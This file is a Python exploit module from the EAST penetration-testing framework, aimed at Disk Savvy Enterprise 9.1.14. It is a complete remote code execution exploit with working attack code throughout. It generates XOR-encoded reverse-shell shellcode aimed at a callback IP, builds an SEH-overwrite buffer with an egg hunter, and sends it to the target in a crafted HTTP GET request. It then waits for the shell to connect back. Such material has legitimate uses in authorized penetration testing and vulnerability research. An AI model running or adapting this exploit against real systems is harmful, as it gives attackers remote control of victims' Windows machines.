#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_disk_savvy_enterprise_bof_rce_g"
INFO['DESCRIPTION'] = "Disk Savvy Enterprise 9.1.14 - 'GET' Buffer Overflow"
INFO['VENDOR'] = "http://www.disksavvy.com/"
INFO['DOWNLOAD_LINK'] = 'http://www.disksavvy.com/downloads.html'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40854/']
INFO["CVE Name"] = ''
INFO["NOTES"] = """
SEH Stack Overflow in GET request 
Tested on WINDIWS 7 SP1
"""

INFO['CHANGELOG'] = "01 Dec, 2016. Written by East team"
INFO['PATH'] = 'Exploits/General/'

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.207', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target port')
OPTIONS['CALLBACK_IP'] = socket.gethostbyname(socket.gethostname()), dict(description = 'Callback IP')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.callback_ip = ''
        self.version = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            self.log('Listener not enabled')
            return None
        
        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32        
        badchars = ["\x00", "\x0a", "\x0d", "\x20", '\x09']
        shellcode_type = "reverse"
        
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, self.callback_ip, port, badchars)
        shellcode = s.create_shellcode(shellcode_type, encode=ShellUtils.Constants.EncoderType.XOR)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def run(self):
        self.args()
        self.log('Attacking {}'.format(self.host))
                    
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
            
        shellcode = self.make_sploit()
        if not shellcode:
            self.log('Shellcode not generated')
            self.finish(False)
            
        s = socket.socket()
        connect = s.connect((self.host, self.port))
        
        hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        
        seh = "\xc0\x42\x11\x10"
        nseh = "\xeb\x06\x90\x90"
        
        get = '\x41' * 10
        get += 'w00tw00t'
        get += '\x90' * 2
        get += shellcode
        get += '\x90' * (531 - len(shellcode))
        get += nseh
        get += seh
        get += '\x90' * 8
        get += hunter
        get += '\x44' * (4433 - len(hunter))
        
        packet = "GET /" + get + "HTTP/1.1" + "\r\n"
        packet += "Host: {}\r\n".format(self.host)
        packet += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
        packet += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
        packet += "Accept-Language: en-US,en;q=0.5" + "\r\n"
        packet += "Accept-Encoding: gzip, deflate" + "\r\n"
        packet += "Connection: keep-alive" + "\r\n\r\n"
        
        try:
            s.sendall(packet)
        except Exception as e:
            self.log(e)
            self.finish(False)
        s.close()
        
        self.log('Payload sent. Wait for callback connection')
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()